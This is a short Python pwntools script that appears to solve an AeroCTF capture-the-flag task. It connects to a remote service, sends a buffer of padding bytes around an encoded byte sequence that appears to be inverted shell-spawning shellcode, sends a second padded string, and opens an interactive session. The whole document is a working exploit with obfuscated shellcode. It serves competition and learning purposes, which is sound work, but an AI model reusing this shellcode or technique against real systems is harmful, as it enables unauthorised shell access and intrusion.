from pwn import *

p = remote("tasks.aeroctf.com",33001)
context.log_level = "debug"

payload1 = "\xFF" * 30
payload1 += "\xaf\xb7\xce\x2d\xb7\xce\x09\xb7\x44\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\xac\xab\xa0\x4f\xc4\xf0\xfa"
payload1 += "\xff" * 90

payload2 = "A" * 70
payload2 += "R08S82-84L99C30"

p.send(payload1)
p.recvuntil("\x37\x13")
p.send(payload2)
p.interactive()
